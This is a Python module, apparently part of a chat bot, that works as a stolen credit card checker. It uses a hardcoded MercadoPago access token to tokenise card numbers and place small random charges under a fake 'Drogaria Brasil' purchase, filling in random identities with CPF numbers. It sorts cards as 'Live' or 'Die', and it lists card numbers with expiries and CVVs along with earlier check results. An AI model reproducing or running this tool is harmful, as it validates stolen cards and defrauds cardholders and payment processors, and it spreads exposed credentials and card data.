from datetime import datetime #pylint: disable=wrong-import-position
from datetime import timedelta #pylint: disable=wrong-import-position
import uuid #pylint: disable=wrong-import-position
import mercadopago #pylint: disable=wrong-import-position
from random import randint
import json
from bot.cogs.modules.bin_checker import bin_checker
from bot.cogs.modules.card_validator import check_cc


sdk = mercadopago.SDK("APP_USR-7245274999089440-032116-b9a38cc43c5a9d76b2ba152905945a95-732094096")


def people():
    with open("assets/pessoas.json", "r", encoding="utf8") as f:
        r = json.load(f)
        pessoas = r['pessoa']
        q = len(pessoas)
        pessoa = pessoas[randint(0, q-1)]
        cpf = pessoa['cpf']
        nome = pessoa['nome']
        
        return cpf, nome


def checker(numero, exp_mes, exp_ano, cvv):
    check = bin_checker(numero[:6])
    bandeira = check[0].lower()

    if bandeira == 'visa':
        p_id = 'visa'
    
    elif bandeira == 'mastercard':
        p_id = 'master'
    
    else:
        p_id = ''
    
    
    gen_pay = float(str(randint(1, 5))+'.'+str(randint(0,9)))
    pessoa = people()
    card_token_object = {
        "card_number": numero,
        "security_code": cvv,
        "expiration_year": exp_ano,
        "expiration_month": exp_mes,
        "cardholder": {
            "name": pessoa[1],
            "identification": {
                "CPF": pessoa[0]
            }
        }
    }

    card_token_created = sdk.card_token().create(card_token_object)

    payment_object = {
        "token": card_token_created["response"]["id"],
        "installments":1,
        "transaction_amount": gen_pay,
        "description":"Foi cobrado um valor mediante a compra em nossa loja!",
        "payer":{
            "email": pessoa[1].replace(' ', '').lower()+str(randint(0, 9))+str(randint(0, 9))+'@gmail.com',
            "identification": {
                        "number": pessoa[0],
                        "type": "CPF"
                    }
        },
        "sponsor_id": None,
        "binary_mode": False,
        "additional_info":{
            "items":[
            {
                "id":"",
                "title":"Drogaria Brasil",
                "description": "Foi cobrado um valor mediante a compra em nossa loja!",
                "picture_url":"", #pylint: disable=line-too-long
                "category_id": "",
                "quantity":1,
                "unit_price": gen_pay
            }
            ],
            "shipments":{
                "receiver_address":{
                    "street_name":"Rua Joaquim Pereira da SIlva",
                    "street_number":85,
                    "zip_code":"46490000",
                    "city_name": "Igaporã",
                    "state_name": "Bahia"
                }
            }
        }
    }

    payment_created = sdk.payment().create(payment_object)

    try:
        detalhes = payment_created['response']['status_detail']
        retorno = payment_created['response']['status']
        
        if retorno == 'approved':
            status = 'Dive'
            descricao = 'O pagamento foi aprovado!'
        
        elif detalhes == 'cc_rejected_high_risk':
            status = 'Recusado pelo anti-fraude'
            descricao = 'O cartão está live, porém foi recusado pelo anti-fraude'

        elif retorno == 'in_process':
            status = 'Live'
            descricao = 'O cartão foi aprovado, porém o pagamento está em processamento'

        elif 'cc_rejected_bad_filled' in detalhes:
            status = 'Die'
            descricao = 'O cartão foi recusado por ter algum dado'
            
        else:
            status = 'Die'
            descricao = 'O cartão foi recusado!'

    except:
        print(payment_created)
        status = 'Erro interno'
        descricao = 'Ocorreu algum erro no checker!'

    return status, descricao



def testador(cc):
    check =check_cc(cc)
    if check[0]:
        numero = check[1]
        expiracao = check[2]
        cvv = check[3]
        
        expiracao[expiracao.find('/'):]
        mes = expiracao[:expiracao.find('/')]
        ano = expiracao[expiracao.find('/')+1:]
        if len(ano) == 2:
            ano = '20'+ano
            
        teste = checker(numero, mes, ano, cvv)

        return teste

    else:
        teste = 'Formato de cartão inválido'

        return 'Erro', teste


lista = [
    '6504859900912343|11|24|326',
    '4121772505742114|11|25|831',
    '4121772517316154|10|25|770',
    ]
for item in lista:
    a = testador(item)
    print(a[0]+f' - {item}')









"""die - 5350811019113658|09|28|715
die - 5337286001090230|04|22|225
die - 5447318347890481|04|27|673
erro - 5067228366270516|05|29|937
die - 5225900340004117|08|27|988
die - 5502095605297383|09|28|322
die - 5447317676395344|10|23|682
die - 5447318482126634|04|26|825
die - 5489850360576836|08|24|104
die - 5350810211124455|01|28|849
erro - 5067228213474154|05|29|125
die - 5447318369993841|01|28|245
erro - 5067228560706604|06|29|537
die - 4271670761860042|09|21|053
die - 5345930008882301|12|22|414
die - 5305990456787210|09|28|948
die - 5502098611167301|08|28|318
die - 5447317551076373|07|27|199
die - 5447317579254663|09|23|242
die - 5220270268431170|07|26|368"""